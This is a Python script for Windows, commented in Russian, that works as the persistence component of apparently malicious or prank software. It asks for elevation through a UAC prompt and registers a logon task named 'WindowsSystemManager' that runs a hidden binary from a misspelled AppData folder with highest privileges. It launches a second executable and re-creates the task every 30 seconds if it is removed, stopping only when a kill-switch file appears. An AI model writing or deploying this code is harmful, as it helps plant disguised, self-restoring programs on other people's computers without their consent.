import os, time, subprocess, sys, ctypes


def is_admin(): # проверяю админку
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def is_task_exists(task_name): # Проверка существования таски
    try:
        result = subprocess.run(
            ["schtasks", "/Query", "/TN", task_name],
            capture_output=True, text=True, shell=True
        )
        return "SUCCESS" in result.stdout
    except Exception as e:
        return False
    

def create_task(task_name, exe_path): # Создание таски
    try:
        subprocess.run(
            f'schtasks /Create /SC ONLOGON /TN "{task_name}" /TR "{exe_path}" /RL HIGHEST /F',
            shell=True
        )
    except Exception as e:
        pass


def is_kill_switch_triggered(): # Проверка выключателя
    kill_file = os.path.join(os.getenv('APPDATA'), "kill_la_kill.kill")     # Проверка на компе файла kill_la_kill.kill
    if os.path.exists(kill_file):
        return True
    return False


def delete_task(task_name): # Удаление таски
    try:
        subprocess.run(
            f'schtasks /Delete /TN "{task_name}" /F',
            shell=True
        )
    except Exception as e:
        pass


if __name__ == "__main__":
    TASK_NAME = "WindowsSystemManager"
    EXE_PATH = fr"C:/Users/{os.getlogin()}/AppData/Roaming/chache/wind_alert.exe"  # бинарник
    buf = 0

    if is_kill_switch_triggered(): # первичная проверка
        delete_task(TASK_NAME)
        sys.exit()
        buf = 1 # переменная сохраняет статус этой функции

    if not is_task_exists(TASK_NAME) and buf != 1: # проверяю что можно добавлять задачу и делаю это
        if not is_admin(): # проверяю наличие админки по необходимости
            try:
                script = os.path.abspath(sys.argv[0])
                params = " ".join([script] + sys.argv[1:])
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            except Exception as e:
                pass
            sys.exit()
        create_task(TASK_NAME, EXE_PATH)
    
    subprocess.Popen(fr"C:/Users/{os.getlogin()}/AppData/Roaming/chache/sound.exe") # запускаю скрипт со звуками


    while True: # ловим команды
        if is_kill_switch_triggered():
            delete_task(TASK_NAME)
            sys.exit()
            buf = 1

        if not is_task_exists(TASK_NAME) and buf != 1:
            create_task(TASK_NAME, EXE_PATH)
        time.sleep(30)
